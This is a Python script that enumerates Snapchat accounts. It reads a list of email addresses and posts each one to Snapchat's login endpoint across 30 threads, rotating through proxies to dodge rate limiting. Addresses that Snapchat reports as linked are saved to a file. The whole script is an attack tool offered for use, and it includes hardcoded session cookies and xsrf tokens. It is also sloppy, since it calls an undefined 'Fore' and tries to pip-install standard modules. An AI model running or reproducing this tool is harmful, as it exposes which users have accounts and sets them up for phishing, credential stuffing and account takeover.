import os
try:
 import requests,random
except ModuleNotFoundError:
 os.system('pip install requests')
try:
 import time
except ModuleNotFoundError:
 os.system('pip install time')
try:
 import threading
except ModuleNotFoundError:
 os.system('pip install threading')
WIT = "\033[1;37;40m"
RD = "\033[1;31;40m"
SP = '\033[1;33;40m'
r=requests.session()
print(SP+"""
   ____  By JOKER @vv1ck @TweakPY
  / ___| _ __   __ _ _ __  
  \___ \| '_ \ / _` | '_ \ 
   ___) | | | | (_| | |_) |  check EMAIL 
  |____/|_| |_|\__,_|J.__/ 
                    |_|   
"""+WIT)
fils = input('[?] Enter the email file name : ')
try:
	file = open(fils,'r')
except FileNotFoundError:
	print(f'[!] {file} file not found')
	input('Enter to exit')
	exit()
prxs = input('[?] Enter the proxy file name : ')
try:
	proxy =  open(prxs,'r').read().splitlines()
except FileNotFoundError:
	print(f'[!] {prxs} file not found')
	input('Enter to exit')
	exit()
print('********** Checker started **********')
time.sleep(1.2)
def snapchatCK():
	while True:
		emal = file.readline().split('\n')[0]
		QTR = []
		for pro in proxy:
			QTR.append(pro)
			JO = str(random.choice(QTR))
		PROXY = {"https":JO,"http":JO}
		headers={
'Host': 'accounts.snapchat.com',
'Cookie': 'xsrf_token=Fsvfoa9lfV2fzWdckqbU5A; web_client_id=f3f58572-c6f6-47ee-99a1-a4dccfd848d0',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Accept': 'application/json, text/plain, */*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application/json',
'X-Xsrf-Token': 'Fsvfoa9lfV2fzWdckqbU5A',
'Content-Length': '47',
'Origin': 'https://accounts.snapchat.com',
'Referer': 'https://accounts.snapchat.com/accounts/merlin/login',
'Te': 'trailers',
'Connection': 'close'} 
		try:
			Send = r.post('https://accounts.snapchat.com/accounts/merlin/login',headers=headers,json={"email":emal,"app":"BITMOJI_APP"},proxies=PROXY)
			if 'hasSnapchat' in Send.text:
				print(Fore.GREEN+'[+] linked on snapchat ')
				print('  Email >> '+emal)
				with open('linked-snap.txt', 'a') as x:
					x.write(emal+ '\n')
			elif Send.status_code == 204:
				print(RD+'[-] Not linked on snapchat')
				print('  Email >> '+emal)
			elif Send.status_code == 429:
				print(WIT+'[-] Bad proxy..')
			else:
				pass
		except requests.exceptions.ConnectionError:
			print(WIT+'[-] Bad proxy..')
		except KeyboardInterrupt:
			exit()
J_QTR =[]
for i in range(30):
	th1 = threading.Thread(target=snapchatCK)
	th1.start()
	J_QTR.append(th1)
for th2 in J_QTR:th2.join()
